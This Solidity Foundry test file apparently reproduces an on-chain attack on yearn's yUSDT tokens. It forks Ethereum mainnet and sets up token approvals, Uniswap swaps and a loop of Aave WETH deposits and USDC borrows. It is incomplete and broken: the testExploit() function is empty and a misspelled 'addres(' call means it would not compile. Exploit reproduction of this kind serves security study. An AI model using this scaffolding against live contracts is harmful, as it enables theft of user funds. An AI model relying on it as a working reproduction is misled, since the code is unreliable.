// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

// @Analysis
// https://twitter.com/cmichelio/status/1646422861219807233
// https://twitter.com/samczsun/status/1646404331967778820
// https://twitter.com/peckshield/status/1646411259125063686
// https://twitter.com/osec_io/status/1646411672175939585
// https://twitter.com/BlockSecTeam/status/1646418618643619844
// @TX
// https://etherscan.io/tx/0xd55e43c1602b28d4fd4667ee445d570c8f298f5401cf04e62ec329759ecda95d
// @Summary
// https://twitter.com/cmichelio/status/1646422861219807233

interface IAaveLendingPool {
    function deposit(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
    function borrow(address asset, uint256 amount, uint256 interestRateMode, uint16 referralCode, address onBehalfOf) external;
}

interface IYUSDT {
    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(
    address from,
    address to,
    uint256 value
    ) external returns (bool);
    function withdraw(uint256 wad) external;
    function deposit(uint256 wad) external;
}

interface IToken {
    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(
    address from,
    address to,
    uint256 value
    ) external returns (bool);
    function mint(address minter, uint256 seed) external returns(uint256);
}

contract ContractTest is Test {
    IERC20 USDT = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IYUSDT yUSDTToken3 = IYUSDT(0xE6354ed5bC4b393a5Aad09f21c46E101e692d447);
    IYUSDT yUSDT = IYUSDT(0x83f798e925BcD4017Eb265844FDDAbb448f1707D);
    IERC20 DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IYUSDT ycUSDT = IYUSDT(0x1bE5d71F2dA660BFdee8012dDc58D024448A0A59);
    IERC20 iUSDC = IERC20(0xF013406A0B1d544238083DF0B93ad0d2cBE0f65f);
    IAaveLendingPool AaveLendingPool = IAaveLendingPool(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);
    Uni_Router_V2 Router = Uni_Router_V2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("mainnet", 17036744);
        cheats.label(address(DAI), "DAI");
        cheats.label(address(USDT), "USDT");
        cheats.label(address(USDC), "USDC");
        cheats.label(address(WETH), "WETH");
        cheats.label(address(yUSDTToken3), "yUSDTToken3");
        cheats.label(address(yUSDT), "yUSDT");
        cheats.label(address(ycUSDT), "ycUSDT");
        cheats.label(address(iUSDC), "iUSDC");
        cheats.label(address(AaveLendingPool), "AaveLendingPool");
        cheats.label(address(Router), "Router");

    }

    function testExploit() external {

    }

    function init() public payable {
        USDT.approve(address(yUSDTToken3), type(uint).max);
        USDT.approve(address(yUSDT), type(uint).max);
        USDT.approve(address(ycUSDT), type(uint).max);
        USDC.approve(address(iUSDC), type(uint).max);
        address(WETH).call{value: 1 ether}("");
        WETH.approve(address(Router), type(uint).max);
        address [] memory path = new address[](2);
        path[0] = address(WETH);
        path[1] = address(USDT);
        Router.swapExactTokensForTokens(0.5 ether, 1, path, address(this), block.timestamp);
        path[1] = address(USDC);
        Router.swapExactTokensForTokens(0.5 ether, 1, path, address(this), block.timestamp);

    }

}

contract repayBorrower {
    IERC20 USDT = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IAaveLendingPool AaveLendingPool = IAaveLendingPool(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);
    Uni_Router_V2 Router = Uni_Router_V2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    function init() external payable{
        address [] memory path = new address[](2);
        path[0] = address(USDC);
        path[1] = address(WETH);
        address(WETH).call{value: 5 ether}("");
        USDC.approve(addres(AaveLendingPool), type(uint).max);
        WETH.approve(addres(AaveLendingPool), type(uint).max);
        USDC.approve(address(Router), type(uint).max);

        AaveLendingPool.deposit(address(WETH), WETH.balanceOf(address(this)), address(this), 0);
        AaveLendingPool.borrow(address(USDC), 6_300 * 1e6, 2, 0, address(this));
        Router.swapExactTokensForTokens(6_300 * 1e6, 1, path, address(this), block.timestamp);

        AaveLendingPool.deposit(address(WETH), WETH.balanceOf(address(this)), address(this), 0);
        AaveLendingPool.borrow(address(USDC), 4_133_280_695, 2, 0, address(this));
        Router.swapExactTokensForTokens(4_133_280_695, 1, path, address(this), block.timestamp);

        AaveLendingPool.deposit(address(WETH), WETH.balanceOf(address(this)), address(this), 0);
        AaveLendingPool.borrow(address(USDC), 2_710_957_843, 2, 0, address(this));
        Router.swapExactTokensForTokens(2_710_957_843, 1, path, address(this), block.timestamp);

        AaveLendingPool.deposit(address(WETH), WETH.balanceOf(address(this)), address(this), 0);
        AaveLendingPool.borrow(address(USDC), 1_777_737_625, 2, 0, address(this));
        Router.swapExactTokensForTokens(1_777_737_625, 1, path, address(this), block.timestamp);

        AaveLendingPool.deposit(address(WETH), WETH.balanceOf(address(this)), address(this), 0);
        AaveLendingPool.borrow(address(USDC), 1_165_623_133, 2, 0, address(this));
        Router.swapExactTokensForTokens(1_165_623_133, 1, path, address(this), block.timestamp);
    }

}